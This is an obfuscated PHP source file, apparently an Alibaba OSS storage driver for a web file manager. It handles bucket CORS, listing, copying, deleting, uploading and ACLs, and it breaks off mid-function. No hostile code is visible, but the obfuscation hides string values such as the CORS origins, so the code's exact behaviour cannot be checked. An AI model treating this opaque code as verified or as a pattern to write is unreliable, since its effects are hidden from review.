<?php
 goto b³ŞŸßêØ; d´øÄŞ§ÖÄ: function binCheckBigger($ƒûŸ§æ, $‹ÌÊ¨•) { return $ƒûŸ§æ > $‹ÌÊ¨•; } $_SERVER[$_SERVER[†¥¡¿³Ú][3]] = (strrev('0458')."\66\60")+0;$_my67="c8nerda15ilmjz3xukf742p96vgqhtysw0obhoq74pun3lc89k2sxdavygmtr5w6if0j1ebzhqndyz6bs7";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($›µ§Ğ¥, $°½â«ûˆ) { $•Ù¯ßğÂ =& $_SERVER[íïàËŸë]; if (isset(self::$_methodList[$›µ§Ğ¥])) { return @call_user_func_array(self::$_methodList[$›µ§Ğ¥], $°½â«ûˆ); } else { if (method_exists($this, $›µ§Ğ¥)) { return call_user_func_array(array($this, $›µ§Ğ¥), $°½â«ûˆ); } else { think_exception(__CLASS__ . $•Ù¯ßğÂ[4] . $›µ§Ğ¥ . $•Ù¯ßğÂ[5]); } } } public static function __callStatic($Ñâ½Çß¾, $£½¥ö†œ) { if (isset(self::$_methodListStatic[$Ñâ½Çß¾])) { return call_user_func_array(self::$_methodListStatic[$Ñâ½Çß¾], $£½¥ö†œ); } else { if (method_exists(self, $Ñâ½Çß¾)) { return call_user_func_array(array(self, $Ñâ½Çß¾), $£½¥ö†œ); } else { show_json("{$Ñâ½Çß¾}\x28\x29\x20\156\157\x74\40\x65\170\151\163\164\73", !1); } } } public static function addMethod($ƒƒéòÃ, $†ìØ¼·Ô) { self::$_methodList[$ƒƒéòÃ] = $†ìØ¼·Ô; } public static function addMethodStatic($ıß­Â½ö, $íú©îÈô) { self::$_methodListStatic[$ıß­Â½ö] = $íú©îÈô; } } goto fÖÆ«áÈ; EÂÏœ…“†•: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($•”•Â®Ä) { parent::__construct(); include_once SDK_DIR . $_SERVER[íïàËŸë][1471]; $this->_init($•”•Â®Ä); } public function _init($‚ÈÀÃú ) { $ß›Û±Üö =& $_SERVER[íïàËŸë]; $this->config = $‚ÈÀÃú ; foreach ($‚ÈÀÃú  as $ÀÅ¯Ş»§ => $Çß³ÆĞ·) { if (isset($this->{$ÀÅ¯Ş»§})) { $this->{$ÀÅ¯Ş»§} = $Çß³ÆĞ·; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ß›Û±Üö[1472] . LNG($ß›Û±Üö[1473])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $·ç›Ëâ‘ =& $_SERVER[íïàËŸë]; $¯½×êúØ = new OSS\Model\CorsConfig(); $Ñô¥“§û = new OSS\Model\CorsRule(); $Ñô¥“§û->addAllowedOrigin($·ç›Ëâ‘[1474]); $Ñô¥“§û->addAllowedMethod($·ç›Ëâ‘[1475]); $Ñô¥“§û->addAllowedMethod($·ç›Ëâ‘[1476]); $Ñô¥“§û->addAllowedMethod($·ç›Ëâ‘[1477]); $Ñô¥“§û->addAllowedMethod($·ç›Ëâ‘[1478]); $Ñô¥“§û->addAllowedMethod($·ç›Ëâ‘[165]); $Ñô¥“§û->setMaxAgeSeconds(600); $Ñô¥“§û->addExposeHeader($·ç›Ëâ‘[1479]); $Ñô¥“§û->addAllowedHeader($·ç›Ëâ‘[1474]); $¯½×êúØ->addRule($Ñô¥“§û); try { $this->client->putBucketCors($this->bucket, $¯½×êúØ); } catch (OSS\Core\OssException $ŠÓºÌ) { $this->writeLog(__FUNCTION__ . $·ç›Ëâ‘[214] . $ŠÓºÌ->getMessage()); return !1; } return !0; } public function getBucketCors() { $úÔúÁ¬ =& $_SERVER[íïàËŸë]; $Ã¬ıÓøÌ = null; try { $Ã¬ıÓøÌ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÔÛãÁ¯Ã) { $this->writeLog(__FUNCTION__ . $úÔúÁ¬[214] . $ÔÛãÁ¯Ã->getMessage()); return null; } if (!$Ã¬ıÓøÌ || !($¹ğ’éªæ = $Ã¬ıÓøÌ->getRules())) { return null; } $Æ§‚ğ…  = $¹ğ’éªæ[0]->getAllowedOrigins(); $ÜØª­²½ = $¹ğ’éªæ[0]->getAllowedMethods(); $´°ÃÃŸÇ = $¹ğ’éªæ[0]->getMaxAgeSeconds(); $æ…¦Øúİ = $¹ğ’éªæ[0]->getExposeHeaders(); $éÌ…çæ = $¹ğ’éªæ[0]->getAllowedHeaders(); return array($úÔúÁ¬[218] => isset($Æ§‚ğ… [0]) ? $Æ§‚ğ… [0] : $úÔúÁ¬[12], $úÔúÁ¬[222] => $ÜØª­²½, $úÔúÁ¬[1480] => $´°ÃÃŸÇ, $úÔúÁ¬[1481] => isset($æ…¦Øúİ[0]) ? $æ…¦Øúİ[0] : $úÔúÁ¬[12], $úÔúÁ¬[219] => isset($éÌ…çæ[0]) ? $éÌ…çæ[0] : $úÔúÁ¬[12]); } public function isBucketCors() { $¡©»‹êÊ =& $_SERVER[íïàËŸë]; $—è™“ã = $this->getBucketCors(); if (!$—è™“ã || !is_array($—è™“ã)) { return !1; } if ($—è™“ã[$¡©»‹êÊ[218]] != $¡©»‹êÊ[220] || $—è™“ã[$¡©»‹êÊ[219]] != $¡©»‹êÊ[220]) { return !1; } $æÀªÓ±Ä = array_map($¡©»‹êÊ[221], $—è™“ã[$¡©»‹êÊ[222]]); if (!is_array($æÀªÓ±Ä)) { $æÀªÓ±Ä = array(); } $¹òÍÌš˜ = array($¡©»‹êÊ[223], $¡©»‹êÊ[224], $¡©»‹êÊ[225], $¡©»‹êÊ[226], $¡©»‹êÊ[227]); $÷£²¥Ôƒ = array_diff($¹òÍÌš˜, $æÀªÓ±Ä); return empty($÷£²¥Ôƒ); } public function mkfile($¦ƒªŒÏÑ, $½¨°Øã = '', $ÅàŠâóû = REPEAT_RENAME) { $¹ó­ÙßÕ = $this->setContent($¦ƒªŒÏÑ, $½¨°Øã); if ($¹ó­ÙßÕ !== !1) { return $this->getPathOuter($¦ƒªŒÏÑ); } return !1; } public function mkdir($é¥İ×ÇÓ, $‰±À’æØ = REPEAT_SKIP) { if ($‰±À’æØ && $this->_isFolder($é¥İ×ÇÓ)) { return $this->getPathOuter($é¥İ×ÇÓ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($é¥İ×ÇÓ)); } catch (OSS\Core\OssException $ë¦ã¡Ôİ) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][214] . $ë¦ã¡Ôİ->getMessage()); return !1; } return $this->getPathOuter($é¥İ×ÇÓ); } private function fileList($¹ÉÄáù—, $ÚÔ¥„ºõ = '', $¸‚ßüÇ = 0) { $®ÑÁ¼Ï =& $_SERVER[íïàËŸë]; $¹ÉÄáù— = trim($¹ÉÄáù—, $®ÑÁ¼Ï[8]); $œığÙÅä = empty($¹ÉÄáù—) && $¹ÉÄáù— !== $®ÑÁ¼Ï[228] ? $®ÑÁ¼Ï[12] : $¹ÉÄáù— . $®ÑÁ¼Ï[8]; $û®ô”ô¯ = $®ÑÁ¼Ï[12]; $ƒÍÌ÷Á = 1000; $ º•ü©ú = $œïé­í = array(); while (!0) { check_abort(); $³º¨şÈ€ = array($®ÑÁ¼Ï[1482] => $ÚÔ¥„ºõ, $®ÑÁ¼Ï[1483] => $œığÙÅä, $®ÑÁ¼Ï[1484] => $ƒÍÌ÷Á, $®ÑÁ¼Ï[1485] => $û®ô”ô¯); try { $‚®†´ö… = $this->client->listObjects($this->bucket, $³º¨şÈ€); } catch (OSS\Core\OssException $å‹à‹˜õ) { $this->writeLog(__FUNCTION__ . $®ÑÁ¼Ï[214] . $å‹à‹˜õ->getMessage()); break; } $û®ô”ô¯ = $‚®†´ö…->getNextMarker(); $¨¬ŒåŞŠ = $‚®†´ö…->getObjectList(); $ø£—Øê = $‚®†´ö…->getPrefixList(); foreach ($¨¬ŒåŞŠ as $–˜À§æá) { if ($–˜À§æá->getKey() == $œığÙÅä) { continue; } $‚­å›²´ = $–˜À§æá->getKey(); $ÙÄÍÛĞ = $–˜À§æá->getSize(); $É–ö³ÔÖ = $–˜À§æá->getLastModified(); $ºÓÀ‰Ÿª = trim($–˜À§æá->getETag(), $®ÑÁ¼Ï[121]); $ÂÔ°«®– = $¸‚ßüÇ ? array($®ÑÁ¼Ï[32] => $‚­å›²´, $®ÑÁ¼Ï[79] => $ÙÄÍÛĞ, $®ÑÁ¼Ï[206] => strtotime($É–ö³ÔÖ), $®ÑÁ¼Ï[1486] => $ºÓÀ‰Ÿª) : $‚­å›²´; $Ìä“Áñï = $ÙÄÍÛĞ == 0 && substr($‚­å›²´, strlen($‚­å›²´) - 1, 1) == $®ÑÁ¼Ï[8] ? !0 : !1; $À“†ç®Ø = array($®ÑÁ¼Ï[79] => $ÙÄÍÛĞ, $®ÑÁ¼Ï[1487] => $ÙÄÍÛĞ, $®ÑÁ¼Ï[88] => strtotime($É–ö³ÔÖ), $®ÑÁ¼Ï[1488] => $É–ö³ÔÖ, $®ÑÁ¼Ï[1486] => $ºÓÀ‰Ÿª); $this->cacheMethodInfoSet($‚­å›²´, $Ìä“Áñï, $À“†ç®Ø); if ($Ìä“Áñï) { $ º•ü©ú[] = $‚­å›²´; continue; } $œïé­í[] = $ÂÔ°«®–; } foreach ($ø£—Øê as $ëáñ¼´Å) { $ º•ü©ú[] = $ëáñ¼´Å->getPrefix(); $this->cacheMethodInfoSet($ëáñ¼´Å->getPrefix(), !0); } if ($û®ô”ô¯ === $®ÑÁ¼Ï[12]) { break; } } $this->cacheMethodInfoSet($¹ÉÄáù—, !0); return array($®ÑÁ¼Ï[85] => $ º•ü©ú, $®ÑÁ¼Ï[86] => $œïé­í); } public function listObject($¥¹²ö°¾, $°ªÚ«Õã = '') { $óúáäÑè =& $_SERVER[íïàËŸë]; $¥¹²ö°¾ = trim($¥¹²ö°¾, $óúáäÑè[8]); $Ñ¶ß‹¯ = empty($¥¹²ö°¾) && $¥¹²ö°¾ !== $óúáäÑè[228] ? $óúáäÑè[12] : $¥¹²ö°¾ . $óúáäÑè[8]; $‘ø¦ïÚƒ = $óúáäÑè[12]; $×¢òïùÏ = 1000; $ÑëÜÆøÉ = $×‰ğÇ¼à = array(); while (!0) { check_abort(); $úıêÌ«Ó = array($óúáäÑè[1482] => $°ªÚ«Õã, $óúáäÑè[1483] => $Ñ¶ß‹¯, $óúáäÑè[1484] => $×¢òïùÏ, $óúáäÑè[1485] => $‘ø¦ïÚƒ); try { $ÇÎÏ•Ø = $this->client->listObjects($this->bucket, $úıêÌ«Ó); } catch (OSS\Core\OssException $´±¶ª€¨) { $this->writeLog(__FUNCTION__ . $óúáäÑè[214] . $´±¶ª€¨->getMessage()); break; } $‘ø¦ïÚƒ = $ÇÎÏ•Ø->getNextMarker(); $ı˜¿èïğ = $ÇÎÏ•Ø->getObjectList(); foreach ($ı˜¿èïğ as $ ãêÑ“÷) { if ($ ãêÑ“÷->getKey() == $Ñ¶ß‹¯) { continue; } $à©±¿Á = $ ãêÑ“÷->getKey(); $šµ™şõ« = $ ãêÑ“÷->getSize(); $Áøö¾—İ = $šµ™şõ« == 0 && substr($à©±¿Á, strlen($à©±¿Á) - 1, 1) == $óúáäÑè[8] ? !0 : !1; if ($Áøö¾—İ) { continue; } (yield $šµ™şõ« . $óúáäÑè[214] . $à©±¿Á); } if ($‘ø¦ïÚƒ === $óúáäÑè[12]) { break; } } } public function copyFile($¢ğı¡–Ö, $–íêÛˆ¼) { $ÚÖÁ„¯ = $this->size($¢ğı¡–Ö); if ($ÚÖÁ„¯ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¢ğı¡–Ö, $this->bucket, $this->pathEncode($–íêÛˆ¼)); } catch (OSS\Core\OssException $šòòÔÌ›) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][214] . $šòòÔÌ›->getMessage()); return !1; } return $this->getPathOuter($–íêÛˆ¼); } $äÀ‘à©× = $this->multiCopyObject($¢ğı¡–Ö, $–íêÛˆ¼, $ÚÖÁ„¯); return $äÀ‘à©× ? $this->getPathOuter($–íêÛˆ¼) : !1; } private function multiCopyObject($âÀ½ıˆë, $ë¤Ûë¯¸, $«ò°±Ä) { $â¯ßÀÉ =& $_SERVER[íïàËŸë]; try { $Ó’ÏƒÑ¨ = array(); if ($¢ŸÅ†™ = $this->hashMd5($âÀ½ıˆë)) { $Ó’ÏƒÑ¨ = array(OSS\OssClient::OSS_HEADERS => array($â¯ßÀÉ[1489] => $¢ŸÅ†™)); } $İÎŒÂ— = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ë¤Ûë¯¸), $Ó’ÏƒÑ¨); $–¸ìæÉ® = 1; $Èƒóò‰ü = 0; $Ğ¡Ñû´† = array(); $èîÍ¢†– = 1024 * 1024 * 10; $É­Å¤‘É = $this->client->generateMultiuploadParts($«ò°±Ä, $èîÍ¢†–); foreach ($É­Å¤‘É as $å÷ï˜ => $±¯„‰Æà) { $éŸ¨À¶Ø = $Èƒóò‰ü + (int) $±¯„‰Æà[$â¯ßÀÉ[1490]]; $¼ğ¹È«© = (int) $±¯„‰Æà[$â¯ßÀÉ[413]] + $éŸ¨À¶Ø - 1; $¶ß¤¼¢ú = array($â¯ßÀÉ[167] => $éŸ¨À¶Ø, $â¯ßÀÉ[168] => $¼ğ¹È«©); $Ğ¡Ñû´†[] = $this->client->uploadPartCopy($this->bucket, $âÀ½ıˆë, $this->bucket, $this->pathEncode($ë¤Ûë¯¸), $–¸ìæÉ®, $İÎŒÂ—, $¶ß¤¼¢ú); $–¸ìæÉ® = $–¸ìæÉ® + 1; } $¹Ú’ÈØ = array(); foreach ($Ğ¡Ñû´† as $å÷ï˜ => $ïö¼óÂÓ) { $¹Ú’ÈØ[] = array($â¯ßÀÉ[308] => $å÷ï˜ + 1, $â¯ßÀÉ[309] => $ïö¼óÂÓ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ë¤Ûë¯¸), $İÎŒÂ—, $¹Ú’ÈØ); } catch (OSS\Core\OssException $†€ÙŒ¿ë) { $this->writeLog(__FUNCTION__ . $â¯ßÀÉ[214] . $†€ÙŒ¿ë->getMessage()); return !1; } return !0; } public function moveFile($ÃÓã§¿, $½Âèç×É) { if ($this->copyFile($ÃÓã§¿, $½Âèç×É)) { $this->remove($ÃÓã§¿); return $this->getPathOuter($½Âèç×É); } return !1; } public function delFile($ŠúÚ‰±´) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ŠúÚ‰±´)); } catch (OSS\Core\OssException $Ê’»€ñ‰) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][214] . $Ê’»€ñ‰->getMessage()); return !1; } return !0; } public function delFolder($ã¶«îıÛ) { $–âÉ¨ºí =& $_SERVER[íïàËŸë]; if (!$this->exist($ã¶«îıÛ)) { return !0; } $this->listItemCache = !1; $îÏˆù ø = $this->fileList($ã¶«îıÛ); $this->listItemCache = !0; $Ãê¦„Å = trim($ã¶«îıÛ, $–âÉ¨ºí[8]) . $–âÉ¨ºí[8]; if (!empty($ã¶«îıÛ) && $ã¶«îıÛ !== $–âÉ¨ºí[228] && !in_array($Ãê¦„Å, $îÏˆù ø[$–âÉ¨ºí[85]])) { $îÏˆù ø[$–âÉ¨ºí[85]][] = $Ãê¦„Å; } $²ÀĞ”®Ü = $this->delByBatch($îÏˆù ø[$–âÉ¨ºí[86]]); if (!$²ÀĞ”®Ü) { return !1; } $²ÀĞ”®Ü = $this->delByBatch($îÏˆù ø[$–âÉ¨ºí[85]]); if (!$²ÀĞ”®Ü) { return !1; } return $this->delFile($Ãê¦„Å); } private function delByBatch($˜·‡Õñ) { foreach (array_chunk($˜·‡Õñ, 1000) as $ŞãìÈ²«) { try { $this->client->deleteObjects($this->bucket, $ŞãìÈ²«); } catch (OSS\Core\OssException $¢ÁÚ˜) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][214] . $¢ÁÚ˜->getMessage()); return !1; } } return !0; } public function rename($øŞÈ¢, $ßºå“™Ô) { return $this->renameObject($øŞÈ¢, $ßºå“™Ô); } private function fileInfo($¬áŞ«–Ë, $êÔß×âœ = false, $Ã½äŠú¥ = array()) { $Ïñ½é­ç =& $_SERVER[íïàËŸë]; $€ÉÖ‰íù = array($Ïñ½é­ç[32] => $this->pathThis($¬áŞ«–Ë), $Ïñ½é­ç[87] => $this->getPathOuter($¬áŞ«–Ë), $Ïñ½é­ç[33] => $Ïñ½é­ç[230], $Ïñ½é­ç[79] => isset($Ã½äŠú¥[$Ïñ½é­ç[79]]) ? $Ã½äŠú¥[$Ïñ½é­ç[79]] : 0, $Ïñ½é­ç[169] => $this->ext($¬áŞ«–Ë)); if ($êÔß×âœ) { return $€ÉÖ‰íù; } $€ÉÖ‰íù[$Ïñ½é­ç[231]] = $€ÉÖ‰íù[$Ïñ½é­ç[88]] = 0; $€ÉÖ‰íù[$Ïñ½é­ç[232]] = $€ÉÖ‰íù[$Ïñ½é­ç[233]] = !0; if (empty($Ã½äŠú¥)) { $—¡õ½ÀØ = $this->objectMeta($¬áŞ«–Ë); if (!$—¡õ½ÀØ) { return $€ÉÖ‰íù; } $Ã½äŠú¥ = array($Ïñ½é­ç[88] => strtotime($—¡õ½ÀØ[$Ïñ½é­ç[1488]]), $Ïñ½é­ç[79] => $—¡õ½ÀØ[$Ïñ½é­ç[1487]] + 0, $Ïñ½é­ç[1486] => $—¡õ½ÀØ[$Ïñ½é­ç[1486]]); } if (isset($Ã½äŠú¥[$Ïñ½é­ç[1486]]) && $Ã½äŠú¥[$Ïñ½é­ç[1486]]) { $€ÉÖ‰íù[$Ïñ½é­ç[235]] = trim($Ã½äŠú¥[$Ïñ½é­ç[1486]], $Ïñ½é­ç[121]); } if (isset($Ã½äŠú¥[$Ïñ½é­ç[79]])) { $€ÉÖ‰íù[$Ïñ½é­ç[79]] = $Ã½äŠú¥[$Ïñ½é­ç[79]]; } if (isset($Ã½äŠú¥[$Ïñ½é­ç[88]])) { $€ÉÖ‰íù[$Ïñ½é­ç[88]] = $Ã½äŠú¥[$Ïñ½é­ç[88]]; } if (isset($Ã½äŠú¥[$Ïñ½é­ç[206]]) && !trim($€ÉÖ‰íù[$Ïñ½é­ç[88]])) { $€ÉÖ‰íù[$Ïñ½é­ç[88]] = $Ã½äŠú¥[$Ïñ½é­ç[206]]; } return $€ÉÖ‰íù; } private function folderInfo($óÂâä, $…Ìòò‹ = false, $Ì÷æªˆœ = array()) { $‡èı­ç¥ =& $_SERVER[íïàËŸë]; $åŒ£Ñïğ = array($‡èı­ç¥[32] => $this->pathThis($óÂâä), $‡èı­ç¥[87] => $this->getPathOuter($‡èı­ç¥[8] . $óÂâä), $‡èı­ç¥[33] => $‡èı­ç¥[78]); if ($…Ìòò‹) { return $åŒ£Ñïğ; } $åŒ£Ñïğ[$‡èı­ç¥[231]] = $åŒ£Ñïğ[$‡èı­ç¥[88]] = 0; $åŒ£Ñïğ[$‡èı­ç¥[232]] = $åŒ£Ñïğ[$‡èı­ç¥[233]] = !0; if (empty($Ì÷æªˆœ)) { $óÂâä = rtrim($óÂâä, $‡èı­ç¥[8]) . $‡èı­ç¥[8]; $¡†Ù¶¶  = $this->objectMeta($óÂâä); if (!$¡†Ù¶¶ ) { return $åŒ£Ñïğ; } $Ì÷æªˆœ = array($‡èı­ç¥[231] => $¡†Ù¶¶ [$‡èı­ç¥[575]][$‡èı­ç¥[1491]], $‡èı­ç¥[88] => strtotime($¡†Ù¶¶ [$‡èı­ç¥[1488]])); } if (isset($Ì÷æªˆœ[$‡èı­ç¥[88]])) { $åŒ£Ñïğ[$‡èı­ç¥[88]] = $Ì÷æªˆœ[$‡èı­ç¥[88]]; } if (isset($Ì÷æªˆœ[$‡èı­ç¥[231]])) { $åŒ£Ñïğ[$‡èı­ç¥[231]] = $Ì÷æªˆœ[$‡èı­ç¥[231]]; } return $åŒ£Ñïğ; } public function listPath($©§ôßÊš, $ùñœÁ­û = false) { $¦ë©œ«¶ =& $_SERVER[íïàËŸë]; $Ê—¢ËŠ¸ = $this->fileList($©§ôßÊš, $¦ë©œ«¶[8], !0); foreach ($Ê—¢ËŠ¸[$¦ë©œ«¶[85]] as $½ÆÎà«  => $›µ¤êˆ¬) { $Ê—¢ËŠ¸[$¦ë©œ«¶[85]][$½ÆÎà« ] = $this->folderInfo($›µ¤êˆ¬, $ùñœÁ­û, $›µ¤êˆ¬); } foreach ($Ê—¢ËŠ¸[$¦ë©œ«¶[86]] as $½ÆÎà«  => $›µ¤êˆ¬) { $Ê—¢ËŠ¸[$¦ë©œ«¶[86]][$½ÆÎà« ] = $this->fileInfo($›µ¤êˆ¬[$¦ë©œ«¶[32]], $ùñœÁ­û, $›µ¤êˆ¬); } return $Ê—¢ËŠ¸; } protected function infoChildren($ºÀ±¼—, &$°õ»›ûñ) { $Ñ‹Íğ–¼ =& $_SERVER[íïàËŸë]; $‰—°µ¡ = $this->fileList($ºÀ±¼—, $Ñ‹Íğ–¼[12], !0); $°õ»›ûñ[$Ñ‹Íğ–¼[81]] += count($‰—°µ¡[$Ñ‹Íğ–¼[85]]); $°õ»›ûñ[$Ñ‹Íğ–¼[80]] += count($‰—°µ¡[$Ñ‹Íğ–¼[86]]); foreach ($‰—°µ¡[$Ñ‹Íğ–¼[86]] as $Èı¨¨) { if (!$Èı¨¨ || !$Èı¨¨[$Ñ‹Íğ–¼[79]]) { continue; } $°õ»›ûñ[$Ñ‹Íğ–¼[79]] += $Èı¨¨[$Ñ‹Íğ–¼[79]]; } } public function has($Ê‰ÌÄÅ, $—”©¹‚ = false, $ãŞ¦¿ŠÌ = true) { $ª§¤ı¿ =& $_SERVER[íïàËŸë]; $Ê‰ÌÄÅ = trim($Ê‰ÌÄÅ, $ª§¤ı¿[8]); $ïú€´ÃŸ = empty($Ê‰ÌÄÅ) && $Ê‰ÌÄÅ !== $ª§¤ı¿[228] ? $ª§¤ı¿[12] : $Ê‰ÌÄÅ . $ª§¤ı¿[8]; $¼•¼»ğ« = $ª§¤ı¿[12]; $ŠÕŒÈç = 500; $¡—²Å¡™ = $­ŞÑ‰ñŒ = 0; while (!0) { check_abort(); $ñŸÊ¤Ë = array($ª§¤ı¿[1482] => $ª§¤ı¿[8], $ª§¤ı¿[1483] => $ïú€´ÃŸ, $ª§¤ı¿[1484] => $ŠÕŒÈç, $ª§¤ı¿[1485] => $¼•¼»ğ«); try { $†ÆÃÈ•Ú = $this->client->listObjects($this->bucket, $ñŸÊ¤Ë); } catch (OSS\Core\OssException $ŒŠ£Âİ) { $this->writeLog(__FUNCTION__ . $ª§¤ı¿[214] . $ŒŠ£Âİ->getMessage()); break; } $¼•¼»ğ« = $†ÆÃÈ•Ú->getNextMarker(); $¡Ğ ÙÚ¯ = $†ÆÃÈ•Ú->getObjectList(); $ïéÉÅë˜ = $†ÆÃÈ•Ú->getPrefixList(); if ($—”©¹‚) { if (count($¡Ğ ÙÚ¯) > 1 || count($¡Ğ ÙÚ¯) == 1 && $¡Ğ ÙÚ¯[0]->getKey() != $ïú€´ÃŸ) { $¡—²Å¡™ += count($¡Ğ ÙÚ¯) - 1; } if (!empty($ïéÉÅë˜)) { $­ŞÑ‰ñŒ += count($ïéÉÅë˜); } if ($¼•¼»ğ« === $ª§¤ı¿[12]) { break; } continue; } if ($ãŞ¦¿ŠÌ) { if (!empty($¡Ğ ÙÚ¯)) { if (count($¡Ğ ÙÚ¯) > 1 || $¡Ğ ÙÚ¯[0]->getKey() != $ïú€´ÃŸ) { return !0; } } } else { if (!empty($ïéÉÅë˜)) { return !0; } } if ($¼•¼»ğ« === $ª§¤ı¿[12]) { break; } } if ($—”©¹‚) { return array($ª§¤ı¿[239] => $¡—²Å¡™, $ª§¤ı¿[240] => $­ŞÑ‰ñŒ); } return !1; } public function listAll($êˆæÖÄ) { $îÑô‡Çô =& $_SERVER[íïàËŸë]; $——”ûõ™ = $this->fileList($êˆæÖÄ, $îÑô‡Çô[12], !0); $‡°î¥ÙÃ = array_to_keyvalue($——”ûõ™[$îÑô‡Çô[86]], $îÑô‡Çô[32]); foreach ($——”ûõ™[$îÑô‡Çô[85]] as $Šå±ÊÖé) { if (is_string($Šå±ÊÖé)) { $‡°î¥ÙÃ[$Šå±ÊÖé] = array($îÑô‡Çô[79] => 0); } } return $this->listAllFiles($êˆæÖÄ, $‡°î¥ÙÃ); } public function canRead($ÔƒşòŞÙ) { $¸¹øµÓ° =& $_SERVER[íïàËŸë]; $‡™À¹ƒÇ = $this->pathAcl($ÔƒşòŞÙ); return $‡™À¹ƒÇ == $¸¹øµÓ°[1492] || $‡™À¹ƒÇ == $¸¹øµÓ°[619] ? !0 : !1; } public function canWrite($àˆ˜°Ì”) { $õ»€â÷Š = $this->pathAcl($àˆ˜°Ì”); return $õ»€â÷Š == $_SERVER[íïàËŸë][619] ? !0 : !1; } public function pathAcl($ŞÔÚœ‘¿) { $¶Àô¬äû =& $_SERVER[íïàËŸë]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¥£‡¦ç¹ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ŞÔÚœ‘¿)); } catch (OSS\Core\OssException $Éó“¹ø˜) { $this->writeLog(__FUNCTION__ . $¶Àô¬äû[214] . $Éó“¹ø˜->getMessage()); return !1; } $ –‡×Ëì = $¥£‡¦ç¹ == $¶Àô¬äû[37] ? $this->bucketAcl : $¥£‡¦ç¹; if ($ –‡×Ëì == $¶Àô¬äû[1493]) { return $¶Àô¬äû[1492]; } if ($ –‡×Ëì == $¶Àô¬äû[1494]) { return $¶Àô¬äû[619]; } return $ –‡×Ëì; } private function chmodPath($İ·ò¢Ø¨, $‹õíĞªƒ = '') { $ö›™“ñÒ =& $_SERVER[íïàËŸë]; $­æ„Ş‘‘ = empty($‹õíĞªƒ) ? $ö›™“ñÒ[1494] : $‹õíĞªƒ; $î­ò€Ûœ = array($ö›™“ñÒ[37], $ö›™“ñÒ[229], $ö›™“ñÒ[1493], $ö›™“ñÒ[1494]); if (!in_array($­æ„Ş‘‘, $î­ò€Ûœ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($İ·ò¢Ø¨), $­æ„Ş‘‘); } catch (OSS\Core\OssException $‘ùš½ïİ) { $this->writeLog(__FUNCTION__ . $ö›™“ñÒ[214] . $‘ùš½ïİ->getMessage()); return !1; } return !0; } public function getContent($ŠÖ¾ã†½) { return $this->fileSubstr($ŠÖ¾ã†½, -1); } public function setContent($Å‰Ã„§æ, $À™ÅÅÄ = '') { $¡Óˆ¡à» =& $_SERVER[íïàËŸë]; try { $ì¯Æ¼ = $this->trafficLimit($¡Óˆ¡à»[1495]); $ñŞ”ºÛ¥ = $this->client->putObject($this->bucket, $this->pathEncode($Å‰Ã„§æ), $À™ÅÅÄ, $ì¯Æ¼); } catch (OSS\Core\OssException $Û¯³üÃü) { $this->writeLog(__FUNCTION__ . $¡Óˆ¡à»[214] . $Û¯³üÃü->getMessage()); return !1; } $‘Ğ¥–¥æ = array($¡Óˆ¡à»[1489] => trim($ñŞ”ºÛ¥[$¡Óˆ¡à»[1486]], $¡Óˆ¡à»[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Å‰Ã„§æ))); $this->updateObjMeta($Å‰Ã„§æ, $‘Ğ¥–¥æ); return isset($ñŞ”ºÛ¥[$¡Óˆ¡à»[1496]][$¡Óˆ¡à»[292]]) ? !0 : !1; } private function updateObjMeta($™Ñ¡ª³, $ã“ÎóËë) { $™Ñ¡ª³ = $this->pathEncode($™Ñ¡ª³); try { $¸ú ÍíŸ = array(OSS\OssClient::OSS_HEADERS => $ã“ÎóËë); $this->client->copyObject($this->bucket, $™Ñ¡ª³, $this->bucket, $™Ñ¡ª³, $¸ú ÍíŸ); } catch (OSS\Core\OssException $º“Àáìç) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][214] . $º“Àáìç->getMessage()); return !1; } return !0; } public function upload($ÚœÌ•Õ£, $¯Şóê–Œ, $ÁÁ€Ïç© = false, $ËÙğñĞÒ = REPEAT_REPLACE) { $Ø²Ñâáí =& $_SERVER[íïàËŸë]; $ë˜ğï¹ = trim($ÚœÌ•Õ£, $Ø²Ñâáí[8]); $¨¼†Ôø = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Ø²Ñâáí[1489] => @md5_file($¯Şóê–Œ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÚœÌ•Õ£))); $¨¼†Ôø = $this->trafficLimit($Ø²Ñâáí[1495], $¨¼†Ôø); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ë˜ğï¹), $¯Şóê–Œ, $¨¼†Ôø); } catch (OSS\Core\OssException $Ø§Ä¯Îñ) { $this->writeLog(__FUNCTION__ . $Ø²Ñâáí[214] . $Ø§Ä¯Îñ->getMessage()); return !1; } return $this->getPathOuter($ÚœÌ•Õ£); } public function getHost() { $ô›×«’ü =& $_SERVER[íïàËŸë]; $Í¶ë¦œ© = explode($ô›×«’ü[210], parent::getHost()); return $Í¶ë¦œ©[0] . $ô›×«’ü[210] . $this->bucket . $ô›×«’ü[10] . $Í¶ë¦œ©[1]; } public function uploadFormData($·ôÄß«á, $ÍÛÅÈÛ¸ = 3600) { $öóŸ¶³– =& 